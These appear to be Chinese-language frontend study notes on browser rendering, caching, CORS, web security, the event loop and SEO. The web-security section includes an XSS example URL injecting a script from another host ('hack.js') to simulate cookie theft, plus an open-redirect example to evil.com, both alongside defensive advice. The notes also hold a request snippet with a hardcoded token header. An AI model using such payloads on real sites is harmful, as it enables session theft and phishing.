https://developers.google.com/web/updates/2018/09/inside-browser-part1

# 从输入 URL 到页面加载完成的过程中都发生了什么事情（https://fex.baidu.com/blog/2014/05/what-happen）
1：构建请求------查找强缓存----DNS解析------建立 TCP 连接 三次握手
4：发送 HTTP 请求-----网络响应
5：浏览器将获取的HTML文档由HTML解析器解析成DOM树（Document Object Model）。
6：同时由CSS解析器将CSS样式解析成CSS规则树（CSS Rule Tree）。
7：将生成的DOM树和CSS规则树合并生成渲染树（Rendering Tree）。
8：在绘制(painting)阶段,渲染引擎会遍历Render树,并调用renderer的 paint() 方法,将renderer的内容显示在屏幕上
9:js渲染-----------------css加载会阻塞后面js语句的执行,而(同步)js脚本执行会阻塞其后的DOM解析
10：客户端与服务器进行TCP的四次挥手。


eg：首先,当我们是要浏览一个网页,我们会在浏览器的地址栏里输入URL,这个时候Browser Process会向这个URL发送请求,获取这个URL的HTML内容,
然后将HTML交给Renderer Process,Renderer Process解析HTML内容,解析遇到需要请求网络的资源又返回来交给Browser Process进行加载,
同时通知Browser Process,需要Plugin Process加载插件资源,执行插件代码。解析完成后Renderer Process计算得到图像帧,并将这些图像帧交给GPU Process,GPU Process将其转化为图像显示屏幕。

# 浏览器渲染页面过程
../note/sublime/assets/浏览器渲染.png
1:通过HTML Parser,解析HTML,生产DOM树,通过CSS Parser,解析CSS,生产CSSOM树
2:将DOM树和CSSOM树通过Attachment结合,生成渲染树(Render Tree)
3:根据生成的渲染树,进行Layout,得到节点的几何信息(位置，大小)
4:根据渲染树以及Layout得到的几何信息,通过Painting得到节点的绝对像素
5:在Painting后,渲染树中包含了大量的渲染元素,每一个渲染元素会被分到一个图层中,每个图层又会被加载到 GPU 形成渲染纹理。然后展示在页面上.

# 遇到JS代码怎么办?
浏览器在解析HTML的过程中,遇到了script元素是不能继续构建DOM树的,它会停止继续构建
首先下载JavaScript代码,并且执行JavaScript的脚本,只有等到JavaScript脚本执行结束后,才会继续解析HTML,构建DOM树.
因为JavaScript的作用之一就是操作DOM,并且可以修改DOM,
如果我们等到DOM树构建完成并且渲染再执行JavaScript,会造成严重的回流和重绘,影响页面的性能,所以会在遇到script元素时,优先下载和执行JavaScript代码,再继续构建DOM树

# 真实DOM和虚拟DOM
真实DOM
优点: 
        操作简单
缺点:
        效率低,解析速度慢,内存占用量过高。
        性能差频繁操作真实DOM,易于导致重绘与回流。

虚拟DOM:
优点：   简单方便:如果使用手动操作真实DOM来完成页面,繁琐又容易出错,在大规模应用下维护起来也很困难.
        性能方面:使用Virtual DOM,能够有效避免真实DOM数频繁更新,减少多次引起重绘与回流，提高性能.
        跨平台:React借助虚拟DOM,带来了跨平台的能力,一套代码多端运行.
缺点     在一些性能要求极高的应用中虚拟 DOM 无法进行针对性的极致优化.
        首次渲染大量DOM时,由于多了一层虚拟DOM的计算,速度比正常稍慢.


# 布局---回流(reflow)---重绘(repaint)：：：：：：：：：
1：第一次确定节点的大小和位置称为布局。随后对节点大小和位置的重新计算称为回流
2：当Render Tree中部分或全部元素的尺寸、结构、或某些属性发生改变时,浏览器重新渲染部分或全部文档的过程称为回流。
3：当页面中元素样式的改变并不影响它在文档流中的位置时（例如 color、background-color、visibility等）,浏览器会将新样式赋予给元素并重新绘制它，这个过程称为重绘
(回流必将引起重绘,重绘不一定会引起回流)


# 会导致回流的操作：：：：：：
页面首次渲染
浏览器窗口大小发生改变
元素尺寸或位置发生改变
元素内容变化（文字数量或图片大小等等）
元素字体大小变化
添加或者删除可见的DOM元素
激活CSS伪类（例如：:hover）
查询某些属性或调用某些方法

#  一些常用且会导致回流的属性和方法：：：：：：：
clientWidth、clientHeight、clientTop、clientLeft
offsetWidth、offsetHeight、offsetTop、offsetLeft
scrollWidth、scrollHeight、scrollTop、scrollLeft
scrollIntoView()、scrollIntoViewIfNeeded()
getComputedStyle()
getBoundingClientRect()
scrollTo()


# 回流的优化：：：：：：：：：：：：：：：：：
1：使用 transform 替代 top (node.style.left="100px")  (node.style.transform="translateX(100px)")
2：不要一次一次的修改样式,而是预先定义好class,直接修改DOM的className,这样只会引发一次重排重绘
3：使用 visibility 替换 display: none ,因为前者只会引起重绘,后者会引发回流
4：改变了布局避免使用table布局,可能很小的一个小改动会造成整个 table 的重新布局。


# 浏览器渲染机制:::::::::::::::::::::::::::::::::
DOM：Document Object Model，浏览器将HTML解析成树形的数据结构,简称DOM。
CSSOM：CSS Object Model，浏览器将CSS解析成树形的数据结构,简称CSSOM。
RenderTree： DOM和CSSOM合并后生成Render Tree
Repaint ——改变某个元素的背景色、文字颜色、边框颜色等等不影响它周围或内部布局的属性时，屏幕的一部分要重画，但是元素的几何尺寸没有变。
Reflow ——元件的几何尺寸变了，我们需要重新验证并计算Render Tree。是Render Tree的一部分或全部发生了变化。
reflow 几乎是无法避免的。现在界面上流行的一些效果，比如树状目录的折叠、展开（实质上是元素的显 示与隐藏）等，都将引起浏览器的 reflow。鼠标滑过、点击……只要这些行为引起了页面上某些元素的占位面积、定位方式、边距等属性的变化，都会引起它内部、周围甚至整个页面的重新渲 染。通常我们都无法预估浏览器到底会 reflow 哪一部分的代码，它们都彼此相互影响着。
注：display: none会触发reflow，而visibility: hidden只会触发repaint，因为没有发现位置变化。


# css 加载会造成阻塞吗？:::::::::::::::::::::::::::::::::::::::::::::
css加载不会阻塞DOM树的解析?----------------下载和解析 CSS 的工作是在预解析线程中进行的。这就是 CSS 不会阻塞 HTML 解析的根本原因。
css加载会阻塞DOM树的渲染?
css加载会阻塞后面js语句的执行?

回答1:DOM 和 CSSOM 通常是并行构建的,所以 CSS 加载不会阻塞DOM 的解析。
回答2:然而由于 Render Tree 是依赖于 DOM Tree 和 CSSOM Tree 的,所以他必须等待到 CSSOM Tree 构建完成,也就是 CSS 资源加载完成(或者 CSS 资源加载失败)后,才能开始渲染。
因此,CSS 加载会阻塞 DOM 的渲染。
回答3:css动画会触发重绘,重绘阻塞js页面

# js 加载会造成阻塞吗？:::::::::::::::::::::::::::::::::::::::::::::
JS 代码的执行过程可能会修改当前的 DOM 树，所以 DOM 树的生成必须暂停。这就是 JS 会阻塞 HTML 解析的根本原因




# 谈一谈你对requestAnimationFrame（RAF）理解::::::::::::::::::
window.requestAnimationFrame()告诉浏览器——你希望执行一个动画，并且要求浏览器在下次重绘之前调用指定的回调函数更新动画。
该方法需要传入一个回调函数作为参数，该回调函数会在浏览器下一次重绘之前执行------cancelAnimationFrame(requestId)
每一帧要在 16.7ms (16.7 = 1000/60) 内完成渲染
RAF 的执行步伐跟着系统的绘制频率走。它能保证回调函数在屏幕每一次的绘制间隔中只被执行一次(上一个知识点刚刚梳理完「函数节流」)，这样就不会引起丢帧现象，也不会导致动画出现卡顿的问题。


# 解决跨域：(https://juejin.cn/post/7075261878997352462)
1：Node中间件代理(两次跨域)(前端先访问已设置Cors的后端1,再让后端1去访问后端2获取数据到后端1,后端1再把数据传到前端)           
   document.domain + iframe  location.hash + iframe
2：Proxy代理跨域
3：WebSocket解决跨域
4：jsonp解决跨域(就是在script标签上面加载资源)
5：后端请求头上面加cors

同源策略是一个安全策略。所谓的同源,指的是协议,域名,端口相同。
浏览器处于安全方面的考虑,只允许本域名下的接口交互,不同源的客户端脚本,在没有明确授权的情况下,不能读写对方的资源。

# 测试跨域
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://47.93.20.245:8710/home/carbon/emission');
xhr.setRequestHeader("Content-type","application/json;charset=UTF-8");
xhr.setRequestHeader("jwt-token","JhbGciOiJSUzI1N");
xhr.send('{"pageSize":"10","pageNo":"1"}');
xhr.onload = function(e) {
var xhr = e.target;
console.log(xhr.responseText);
}

ƒ (e) {
var xhr = e.target;
console.log(xhr.responseText);
}

# 浏览器的本地存储 ：：：：：：：：：：：：：：：：：：：：：：：：：：：：：：
Cookie：体积上限只有4KB。 由于 Cookie 以纯文本的形式在浏览器和服务器中传递(cookie会跟随任意HTTP请求一起发送)
有两种方法可以确保 Cookie 被安全发送,并且不会被意外的参与者或脚本访问: Secure 属性和HttpOnly 属性。

localStorage：只存在客户端,默认不参与与服务端的通信。这样就很好地避免了 Cookie 带来的性能问题和安全问题。
sessionStorage：会话结束,也就是页面关闭,这部分sessionStorage就不复存在了。


#! web安全 网络安全 
https://juejin.cn/post/6844903842635579405#heading-5
https://www.eggjs.org/zh-CN/core/security
https://github.com/ljianshu/Blog/issues/56

1:XSS 攻击的本质是将用户数据当成了 HTML 代码一部分来执行，从而混淆原本的语义，产生新的语义。
  模拟获取cookie-----http://localhost:3000/?from=<script src="http://localhost:4000/hack.js">
  XSS 的原理是恶意攻击者往 Web 页面里插入恶意可执行网页脚本代码，当用户浏览该页之时，嵌入其中 Web 里面的脚本代码会被执行，
  从而可以达到攻击者盗取用户信息或其他侵犯用户安全隐私的目的。
  持久型 XSS
防御:
  设置 HTTP Header 中的 Content-Security-Policy
  对数据进行严格的输出编码:如HTML元素的编码,JS编码,CSS编码,URL编码等等
  输入验证:比如一些常见的数字、URL、电话号码、邮箱地址等等做校验判断
  转义字符，引号、尖括号、斜杠进行转义  str = str.replace(/&/g, '&amp;') str = str.replace(/</g, '&lt;')
  HttpOnly Cookie
  
2:CSRF 英文全称是 Cross-site request forgery,所以又称为“跨站请求伪造”,是指黑客引诱用户打开黑客的网站,在黑客的网站中,利用用户的登录状态发起的跨站请求。简单来讲,「CSRF 攻击就是黑客利用了用户的登录状态，并通过第三方的站点来做一些坏事。

防御:
  Cookie 设置 SameSite 属性。该属性表示 Cookie 不随着跨域请求发送
  Referer Check 来监控CSRF攻击的发生
  Anti CSRF Token  服务端发送一个token过来 客户端请求时携带

3:URL跳转漏洞
  http://www.wooyun.org/login.php?jumpto=http://www.evil.com

4:SQL注入
  访问用户信息  user表被删除

5:DOS和DDOS攻击
  在DoS攻击中，攻击者通过伪造ACK数据包，希望Server重传某些数据包，Server根据TCP重转机制，进行数据重传。攻击者利用TCP协议缺陷，通过发送大量的半连接请求，耗费CPU和内存资源
  DDoS的攻击策略侧重于通过很多“僵尸主机”，向受害主机发送大量看似合法的网络包，从而造成网络阻塞或服务器资源耗尽而导致拒绝服务

6: https中间人攻击


#! 浏览器缓存 :::::::::::: https://github.com/ljianshu/Blog/issues/23 
../note/sublime/assets/浏览器缓存.png

强缓存：
当浏览器去请求某个文件的时候,服务端就在respone header里面对该文件做了缓存配置。缓存的时间、缓存类型都由服务端控制
相关的header: 'Expires' 具体时间过期 'Cache-Control' xxx秒过期  Cache-Control优先级高于Expires
    内存缓存:快速读取 实效性  ---js和图片
    硬盘缓存:速度较慢 读取复杂 -----css文件

协商缓存：
发请求-->看资源是否过期-->过期-->请求服务器-->服务器对比资源是否真的过期-->没过期-->返回304状态码-->客户端用缓存的老资源。
相关的header: 1: 服务器响应请求时 'Last-Modified' 和 客户端再次发起该请求时 'If-Modified-Since'  
             2: 优先考虑Etag'ETag'是服务器计算的hash值 和If-None-Match------Etag值放到request header里的If-None-Match里

'Service Worker'
Service Worker是运行在浏览器背后的独立线程,一般可以用来实现缓存功能。使用 Service Worker的话,传输协议必须为 HTTPS。
因为Service Worker中涉及到请求拦截,所以必须使用HTTPS协议来保障安全。
Service Worker 的缓存与浏览器其他内建的缓存机制不同，它可以让我们自由控制缓存哪些文件、如何匹配缓存、如何读取缓存，并且缓存是持续性的。
Service Worker 实现缓存功能一般分为三个步骤：首先需要先注册 Service Worker,然后监听到 install 事件以后就可以缓存需要的文件，
那么在下次用户访问的时候就可以通过拦截请求的方式查询是否存在缓存，存在缓存的话就可以直接读取缓存文件，否则就去请求数据。
当 Service Worker 没有命中缓存的时候，我们需要去调用 fetch 函数获取数据。也就是说，如果我们没有在 Service Worker 命中缓存的话，会根据缓存查找优先级去查找数据。但是不管我们是从 Memory Cache 中还是从网络请求中获取的数据，浏览器都会显示我们是从 Service Worker 中获取的内容。

# 缓存的机制 https://heyingye.github.io/2018/04/16/%E5%BD%BB%E5%BA%95%E7%90%86%E8%A7%A3%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E7%BC%93%E5%AD%98%E6%9C%BA%E5%88%B6/

强制缓存优先于协商缓存进行，若强制缓存(Expires和Cache-Control)生效则直接使用缓存，
若不生效则进行协商缓存(Last-Modified / If-Modified-Since和Etag / If-None-Match)
协商缓存由服务器决定是否使用缓存，若协商缓存失效，那么代表该请求的缓存失效，重新获取请求结果，再存入浏览器缓存中；生效则返回304，继续使用缓存

浏览器默认的缓存是放在内存内的，但我们知道，内存里的缓存会因为进程的结束或者说浏览器的关闭而被清除，而存在硬盘里的缓存才能够被长期保留下去。
很多时候,我们在network面板中各请求的size项里,会看到两种不同的状态:from memory cache 和 from disk cache,前者指缓存来自内存,
后者指缓存来自硬盘。而控制缓存存放位置的,不是别人,就是我们在服务器上设置的Etag字段。
在浏览器接收到服务器响应后,会检测响应头部(Header),如果有Etag字段,那么浏览器就会将本次缓存写入硬盘中。
之所以拉取缓存会出现200、304两种不同的状态码,取决于浏览器是否有向服务器发起验证请求。 
只有向服务器发起验证请求并确认缓存未被更新,才会返回304状态码。

拓展:
Service Worker

# 注意⚠️
在我们配置缓存时一定要切记,浏览器在处理用户请求时,如果命中强缓存,浏览器会直接拉取本地缓存,
不会与服务器发生任何通信,也就是说,如果我们在服务器端更新了文件,并不会被浏览器得知,就无法替换失效的缓存。
所以我们在构建阶段,需要为我们的静态资源添加md5 hash后缀,避免资源更新而引起的前后端文件无法同步的问题

浏览器的缓存机制指的是通过在一段时间内保留已接收到的 web 资源的一个副本，如果在资源的有效时间内，发起了对这个资源的再一次请求，那么浏览器会直接使用缓存的副本，而不是向服务器发起请求。
使用 web 缓存可以有效地提高页面的打开速度，减少不必要的网络带宽的消耗。
web 资源的缓存策略一般由服务器来指定，可以分为两种，分别是强缓存策略和协商缓存策略。
使用强缓存策略时，如果缓存资源有效，则直接使用缓存资源，不必再向服务器发起请求。强缓存策略可以通过两种方式来设置，分别是 http 头信息中的 Expires 属性和 Cache-Control 属性。
服务器通过在响应头中添加 Expires 属性，来指定资源的过期时间。在过期时间以内，该资源可以被缓存使用，不必再向服务器发送请求。
这个时间是一个绝对时间，它是服务器的时间，因此可能存在这样的问题，就是客户端的时间和服务器端的时间不一致，或者用户可以对客户端时间进行修改的情况，这样就可能会影响缓存命中的结果。
Expires 是 http1.0 中的方式，因为它的一些缺点，在 http 1.1 中提出了一个新的头部属性就是 Cache-Control 属性，它提供了对资源的缓存的更精确的控制。
它有很多不同的值，常用的比如我们可以通过设置 max-age 来指定资源能够被缓存的时间的大小，这是一个相对的时间，
它会根据这个时间的大小和资源第一次请求时的时间来计算出资源过期的时间，因此相对于 Expires 来说，这种方式更加有效一些。
常用的还有比如 private ，用来规定资源只能被客户端缓存，不能够代理服务器所缓存。还有如 
no-store:用来指定资源不能够被缓存。
no-cache:代表该资源能够被缓存,但是立即失效,每次都需要向服务器发起请求。
一般来说只需要设置其中一种方式就可以实现强缓存策略，当两种方式一起使用时，Cache-Control 的优先级要高于 Expires 。
使用协商缓存策略时，会先向服务器发送一个请求，如果资源没有发生修改，则返回一个 304 状态，让浏览器使用本地的缓存副本。如果资源发生了修改，则返回修改后的资源。
协商缓存也可以通过两种方式来设置，分别是 http 头信息中的 Etag 和 Last-Modified 属性。
服务器通过在响应头中添加 Last-Modified 属性来指出资源最后一次修改的时间，当浏览器下一次发起请求时，会在请求头中添加一个 If-Modified-Since 的属性，属性值为上一次资源返回时的 Last-Modified 的值。
当请求发送到服务器后服务器会通过这个属性来和资源的最后一次的修改时间来进行比较，以此来判断资源是否做了修改。
如果资源没有修改，那么返回 304 状态，让客户端使用本地的缓存。如果资源已经被修改了，则返回修改后的资源。使用这种方法有一个缺点，
就是 Last-Modified 标注的最后修改时间只能精确到秒级，如果某些文件在 1 秒钟以内，被修改多次的话，那么文件已将改变了但是 Last-Modified 却没有改变，这样会造成缓存命中的不准确。
因为 Last-Modified 的这种可能发生的不准确性，http 中提供了另外一种方式，那就是 Etag 属性。
服务器在返回资源的时候，在头信息中添加了 Etag 属性，这个属性是资源生成的唯一标识符，当资源发生改变的时候，这个值也会发生改变。在下一次资源请求时，浏览器会在请求头中添加一个 If-None-Match 属性，这个属性的值就是上次返回的资源的 Etag 的值。
服务接收到请求后会根据这个值来和资源当前的 Etag 的值来进行比较，以此来判断资源是否发生改变，是否需要返回资源。通过这种方式，比 Last-Modified 的方式更加精确。
当 Last-Modified 和 Etag 属性同时出现的时候，Etag 的优先级更高。使用协商缓存的时候，服务器需要考虑负载平衡的问题，因此多个服务器上资源的 Last-Modified 应该保持一致，因为每个服务器上 Etag 的值都不一样，因此在考虑负载平衡时，最好不要设置 Etag 属性。
强缓存策略和协商缓存策略在缓存命中时都会直接使用本地的缓存副本，区别只在于协商缓存会向服务器发送一次请求。它们缓存不命中时，都会向服务器发送请求来获取资源。
在实际的缓存机制中，强缓存策略和协商缓存策略是一起合作使用的。浏览器首先会根据请求的信息判断，强缓存是否命中，如果命中则直接使用资源。
如果不命中则根据头信息向服务器发起请求，使用协商缓存，如果协商缓存命中的话，则服务器不返回资源，浏览器直接使用本地资源的副本，如果协商缓存不命中，则浏览器返回最新的资源给浏览器。




# 回收机制::::::::::::::::::::::::::
垃圾回收机制的原理:是找到不再继续使用的变量,也就是程序自己本身都访问不了的变量,释放其内存。垃圾回收器会按照固定的时间间隔(或代码中预定的收集时间)，周期性地执行这一操作;

1.'标记-清除(Mark and Sweep)':垃圾回收器会从根对象（如全局变量、活动函数的局部变量等）开始，标记所有可以访问到的对象。然后，扫描整个堆内存，
将未被标记的对象判定为垃圾对象，将其释放并回收内存。
2.'引用计数(Reference Counting)':垃圾回收器为每个对象维护一个引用计数器，记录对象被引用的次数。当计数器为零时，表示对象不再被引用，可以被回收。
然而，引用计数机制难以处理循环引用的情况，因为循环引用的对象之间的引用计数永远不会变为零。
3.'分代收集(Generational collection)':对象被分成两组：“新的”和“旧的”。在典型的代码中，许多对象的生命周期都很短：
它们出现、完成它们的工作并很快死去，因此在这种情况下跟踪新对象并将其从内存中清除是有意义的。
那些长期存活的对象会变得“老旧”，并且被检查的频次也会降低。

Javascript 会找出不再使用的变量,不再使用意味着这个变量生命周期的结束。Javascript 中存在两种变量——全局变量和局部变量，
全部变量：的声明周期会一直持续，直到页面卸载;
局部变量：声明在函数中，它的声明周期从执行函数开始，直到函数执行结束。
在这个过程中，局部变量会在堆或栈上被分配相应的空间以存储它们的值，函数执行结束，这些局部变量也不再被使用，它们所占用的空间也就被释放;
一个Javascript对象具有对它原型的引用(隐式引用)和对它属性的引用(显式引用)。


# 内存泄漏 (它将可能引起程序的卡顿和崩溃;)::::::::::::::::::::::::::
1:意外的全局变量
2:被忘记的定时器或者回调函数
3:闭包
  1.持有了不再需要的函数引用，会导致函数关联的词法环境无法销毁，从而导致内存泄漏。
  2.当多个函数共享词法环境时，会导致词法环境膨胀。从而触发程序自身无法访问且垃圾回收也无法回收。
4:DOM泄漏---游离DOM引用
浏览器中DOM和js采用的是不一样的引擎,DOM采用的是渲染引擎,而js采用的是v8引擎
5:遗忘的Map、Set对象 ------可以使用WeakMap以及 WeakSet解决 即为弱引用
6:js对象循环引用


#! 浏览器兼容性问题 ：：：：：：：：：：：
@vitejs/plugin-legacy

1:通过rollup构建了面向低版本的资源
rollup cjs esm umd
2:在html入口增加了nomodule的兼容

css兼容性：

			postcss: {
				plugins: [
					autoprefixer({
						overrideBrowserslist: COMPILE_TARGETS,
					}),
				],
			},

比如：：：

* html .test { color: #090; }       /* For IE6 and earlier */
* + html .test { color: #ff0; }     /* For IE7 */

.container {
	display: flex;
	flex-direction: row;
}

需要增加兼容 chrome49 以及 chrome79 以上的样式
.container {
	display: flex;
	flex-direction: column;
	height: 100%;
	min-height: 0;
}


; 浏览器前缀 ：
-moz代表firefox浏览器私有属性
-ms代表IE浏览器私有属性
-webkit代表chrome、safari私有属性
-o代表opera私有属性

; js兼容性
可以使用 const 关键字或 var 关键字来定义常量；IE下，只能使用 var 关键字来定义常量。
解决方案：统一使用 var 关键字来定义常量。



# 浏览器兼容性问题 ：：：：：：：：：：：
原因:浏览器各浏览器使用了不同的内核，并且它们处理同一件事情的时候思路不同。

@vitejs/plugin-legacy

1:通过rollup构建了面向低版本的资源 
rollup cjs esm umd
2:在html入口增加了nomodule的兼容

### js兼容性
可以使用 const 关键字或 var 关键字来定义常量；IE下，只能使用 var 关键字来定义常量。
解决方案：统一使用 var 关键字来定义常量。

### css兼容性:
			postcss: {
				plugins: [
					autoprefixer({
						overrideBrowserslist: COMPILE_TARGETS,
					}),
				],
			}
🌰
* html .test { color: #090; }       /* For IE6 and earlier */
* + html .test { color: #ff0; }     /* For IE7 */

### 浏览器前缀
.container {
	display: flex;
	flex-direction: row;
}
需要增加兼容 chrome49 以及 chrome79 以上的样式
.container {
	display: flex;
	flex-direction: column;
	height: 100%;
	min-height: 0;
}

1： terser + Rollup 兼容旧浏览器
import { terser } from 'rollup-plugin-terser';
import getBabelOutputPlugin from '@rollup/plugin-babel';

export default {
  input: 'src/load.js',
  plugins: [
    // https://github.com/terser/terser#minify-options
    terser({
      ecma: '5',
      compress: true,
      mangle: true,
    }),
    getBabelOutputPlugin({
      babelHelpers: 'bundled',
      presets: [
        ['@babel/preset-env', {
          targets: '> 0.25%, last 2 versions, Firefox ESR, not dead',
        }],
      ],
    }),
  ],
  output: {
    file: 'dist/load.js',
    format: 'iife',
    sourcemap: false,
  },
};


# js的执行机制：：：：：：：：：：：：：：：
js只能是单线程-------------假定JavaScript同时有两个线程,一个线程在某个DOM节点上添加内容,另一个线程删除了这个节点,这时浏览器应该以哪个线程为准？

# 进程---线程 （进（线程）程）：：：：：：：：：：：：：：：：：：：：：：：：：：
进程：是 CPU 资源分配的最小单位可以理解成正在执行的应用程序，
线程：是 CPU 调度的最小单位，可以理解成我们应用程序中的代码的执行器。而他们的关系可想而知，
线程是跑在进程里面的,`一个进程里面可能有一个或者多个线程，而一个线程，只能隶属于一个进程`。

GUI 渲染线程:负责渲染浏览器界面,解析 HTML,CSS,构建 DOM 树和 RenderObject 树,布局和绘制等。
JS 引擎线程:javascript 引擎,也称为 JS 内核,负责处理 Javascript 脚本程序(v8引擎)
HTTP 请求线程:负责执行异步请求一类的函数的线程，如： Promise,axios,ajax等

这个引擎(V8)主要由两部分组成:
内存堆：这是内存分配发生的地方
调用栈：这是你的代码执行时的地方
GUI渲染线程与JS线程是互斥的。所以JS脚本执行和浏览器布局、绘制不能同时执行。


在 JavaScript 运行的时候，主线程会形成一个栈，这个栈主要是解释器用来最终函数执行流的一种机制。
通常这个栈被称为调用栈 Call Stack ，或者执行栈（ Execution Context Stack ）。
调用栈：顾名思义是具有LIFO(后进先出,Last in First Out)的结构。调用栈内存放的是代码执行期间的所有执行上下文
执行上下文中：都会有三个重要的属性 this、变量对象(VO)和作用域链([[scope]])
# 消息（任务）队列
分为宏任务和微任务


参考文章:https://willbchang.notion.site/Event-Loop-da29f0bf1dba42838683b9930702521b
# 事件循环Event Loop是监听并执行消息队列中的任务。 js实现异步的一种方法,也是js的执行机制  
../note/sublime/assets/事件循环.png
外部输入数据-->轮询阶段(poll)-->检查阶段(check)-->关闭事件回调阶段(close callback)-->
定时器检测阶段(timer)-->I/O事件回调阶段(I/O callbacks)-->闲置阶段(idle, prepare)-->轮询阶段..

浏览器执行顺序：执行栈在执行完同步任务之后，如果执行栈为空，
就会去检查微任务（MicroTask）队列是否为空？
------------如果为空的话,就会去执行宏任务队列（MacroTask）
------------如果不为空的话,就会一次性执行完所有的微任务队列

# 事件循环的具体流程如下：
从宏任务队列中，按照 入队顺序 ，找到第一个执行的宏任务，放入调用栈，开始执行；
执行完 该宏任务下所有同步任务后，即调用栈清空后，该宏任务被推出宏任务队列，然后微任务队列开始按照入队顺序，依次执行其中的微任务，
直至微任务队列清空为止 ；当微任务队列清空后，一个事件循环结束；进行GUI渲染
接着从宏任务队列中，找到下一个执行的宏任务，开始第二个事件循环，直至宏任务队列清空为止。

## Promise.resolve().then(() => { }).then(() => { }); 会把连续的then依次按顺序放入本次微任务队列中去 (先进先出)

# 在线调试地址：https://www.jsv9000.app/
macro-task(宏任务)：script,setTimeout,setInterval
micro-task(微任务)：Promise, process.nextTick(Node环境) MutationObserver

# async await
异步代码 同步执行
async函数表示函数里面可能会有异步方法,await后面跟一个表达式,async方法执行时,遇到await会立即执行表达式
然后把表达式后面的代码放到微任务队列里，让出执行栈让同步代码先执行

🌰 async await 案例
let res = function() {
  console.log(1); step 2
  return new Promise((resolve, reject) => {
    console.log(2); step 3
    resolve(4);
  })
}
new Promise(async (resolve, reject) => {
  console.log(3);  step 1
  let test = await res(); 
  console.log(test); step 7
});
console.log(5); step 4
new Promise((resolve, reject) => {
  console.log(6); step 5
});
console.log(7);  step 6


# web worker！！！！！！！！！！！！！！！！！！！！！ demo https://github.com/xy-sea/blog/tree/main/web-worker
  因为js是单线程 当js有大量计算时,会造成 UI 阻塞，出现界面卡顿、掉帧等情况,严重时会出现页面卡死的情况，俗称假死.

#Web Worker 一文彻底了解Web Worker，十万、百万条数据都是弟弟🔥
https://juejin.cn/post/7137728629986820126#heading-9
https://github.com/xy-sea/blog/tree/dev/web-worker


1:开启多线程,并行计算
2:web worker除了单纯进行计算外，还可以结合离屏canvas进行绘图，提升绘图的渲染性能和使用体验

; Web Worker的限制
1、在 Worker 线程的运行环境中没有 window 全局对象，也无法访问 DOM 对象
2、Worker中只能获取到部分浏览器提供的 API，如定时器、navigator、location、XMLHttpRequest等
3、由于可以获取XMLHttpRequest 对象，可以在 Worker 线程中执行ajax请求
4、每个线程运行在完全独立的环境中，需要通过postMessage、 message事件机制来实现的线程之间的通信


# iframe的优缺点
1.会产生很多页面，不容易管理。
3.代码复杂，无法被一些搜索引擎索引到，这一点很关键，现在的搜索引擎爬虫还不能很好的处理iframe中的内容，所以使用iframe会不利于搜索引擎优化。
5.iframe框架页面会增加服务器的http请求，对于大型网站是不可取的。

iframe应用
1:纯前端的utf8和gbk编码互转。比如在utf8页面需要生成一个gbk的encodeURIComponent字符串,
  可以通过页面加载一个gbk的iframe,然后主页面与子页面通信的实现转换
2:跨域通信
3:sandbox沙箱隔离

# 浏览器搜索引擎的原理
1网页抓取（Crawling）：搜索引擎使用称为"蜘蛛"或"爬虫"的程序来抓取互联网上的网页。这些爬虫按照预定的算法和规则，从一个页面到另一个页面，通过链接不断地抓取网页内容。
2网页索引（Indexing）：抓取到的网页内容被存储在搜索引擎的数据库中，形成一个索引。索引是一个巨大的、结构化的数据集，其中包含了抓取到的网页的关键信息，如页面标题、URL、关键字、内容摘要等。
3查询处理（Query Processing）：当用户在浏览器中输入搜索关键字，浏览器将查询关键字发送到搜索引擎服务器。搜索引擎服务器接收到查询后，会进行查询处理，将查询关键字与索引中的网页进行匹配。
4排名算法（Ranking Algorithm）：搜索引擎使用排名算法对匹配的网页进行排序，以确定搜索结果的排名顺序。排名算法考虑多个因素，如关键字的相关性、网页的质量、页面链接的权威性等。
5结果呈现（Result Presentation）：排名确定后，搜索引擎将搜索结果返回给用户。搜索结果通常以页面的形式呈现，显示与查询关键字相关的标题、URL和摘要等信息。用户可以点击搜索结果来访问相应的网页。


# SEO优化
说白了就是使得自己的网站对于搜索引擎的爬虫更加友好，目前单页面应用的大部分做法是使用前端框架，导致主页面没有相关的描述信息，详细信息大部分都是动态生成的，
对于爬虫来说去准确模拟相关的行为获取符合数据是很困难的（对于如此大规模的数据来说）


### SEO优化的优点
可以提高网站在搜索引擎结果页面中的排名和可见性，从而吸引更多的有针对性的流量


# SPA优点
1 切换应用会更加流畅,用户体验好
2 不需要记载整个页面。良好前后端分离
3 切换组件通过发ajax请求资源,服务端不进行渲染,服务端压力小


# SPA单页面应用（Single Page Application，SPA）由于其特殊的前端技术实现方式,可能会导致一些与搜索引擎优化（SEO）相关的问题。以下是一些常见的原因：
1 缺乏静态HTML：传统的多页面应用通常在每个页面上都有独立的HTML内容,而SPA通常只有一个HTML文件。这意味着搜索引擎爬虫无法直接获取到每个页面的静态HTML内容,
从而影响了搜索引擎对网站内容的理解和索引。
2 动态加载内容：SPA通常使用JavaScript来动态加载内容,这意味着页面的内容可能在初始加载时并不完整。搜索引擎爬虫在抓取页面时可能无法执行JavaScript代码,导致无法获取到完整的页面内容。
3 URL结构：SPA通常使用URL的片段标识符(井字符)或者HTML5的历史记录API来实现页面切换,这样的URL结构对搜索引擎来说可能不够友好。搜索引擎更喜欢静态的、有意义的URL，而不是包含特殊字符或片段标识符的URL。
4 缺乏元数据：SPA通常在初始加载时只返回基本的HTML结构,而不包含完整的元数据（如标题、描述、关键词等）。这使得搜索引擎难以理解页面的内容和关联性。


# 改善SPA的SEO
1 预渲染:使用预渲染技术,将SPA的页面在服务器端提前渲染成静态HTML,并将其提供给搜索引擎爬虫。这样可以确保搜索引擎能够获取到完整的页面内容。
2 使用合适的URL结构:尽量使用静态、有意义的URL结构,避免使用片段标识符或特殊字符。
3 提供元数据:在初始加载时，确保页面包含完整的元数据，包括标题、描述、关键词等，以便搜索引擎理解页面的内容。
4 使用合适的链接和导航:确保SPA中的链接和导航可以被搜索引擎爬虫正确解析和跟踪,以便搜索引擎能够索引到所有的页面。


## Nuxt
![alt text](/assets/nuxt.png)

# SSR
![alt text](/assets/ssr.png)



#! 前端模块化：：：：：：：：：：： https://github.com/ljianshu/Blog/issues/48
window----IIFE-------AMD-------CMD--------CommonJs-------UMD(同时兼容了amd cmd common.js的规范)---------ESM

异步模块定义规范(AMD)制定了定义模块的规则,这样模块和模块的依赖可以被异步加载。
这和浏览器的异步加载模块的环境刚好适应(浏览器同步加载模块会导致性能、可用性、调试和跨域访问等问题)
AMD 是一种异步模块规范,RequireJS 是 AMD 规范的实现

